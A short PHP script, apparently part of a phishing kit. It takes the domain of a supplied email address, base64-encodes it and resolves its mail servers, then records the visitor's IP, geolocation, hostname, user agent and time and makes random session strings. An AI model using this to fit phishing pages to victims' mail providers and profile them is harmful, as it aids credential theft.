<?php

require_once 'geo.php';

if( filter_var( $email, FILTER_VALIDATE_EMAIL ) ) {
    // split on @ and return last value of array (the domain)
	$var = explode('@', $email);
	$domain = array_pop($var);
    $encode_domain = base64_encode($domain);

}

$results = dns_get_record($domain, DNS_MX);
// find the lowest value in the "pri" column
$target_pri = min(array_column($results, "pri"));
$highest_pri = array_filter(
    $results,
    // keep anything that matches the lowest (could be more than one)
    function($item) use($target_pri) {return $item["pri"] === $target_pri;}
);
// now loop through each of them, finding all their IP addresses
foreach ($highest_pri as $mx) {
    #echo "$mx[target]: ";
    $results = dns_get_record($mx["target"], DNS_A);
	$results = dns_get_record($mx["target"]);
    foreach ($results as $a) {
        #echo "$a[ip] ";
    }
    $mxrecord = "$mx[target]";
}


if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$geoplugin = new geoPlugin($ip);
$geoplugin->locate();
$cc = $geoplugin->countryCode;
$cn = $geoplugin->countryName;
$cr = $geoplugin->region;
$ct = $geoplugin->city;
$hostname = gethostbyaddr($ip);
$ua = $_SERVER['HTTP_USER_AGENT'];
$datum = date("D M d, Y g:i a");

function random_session_generate($length)
{
$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$rand = substr(str_shuffle( $chars ),0, $length );
return $rand;
}
$session = random_session_generate(22);
$rand = random_session_generate(48);

$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

?>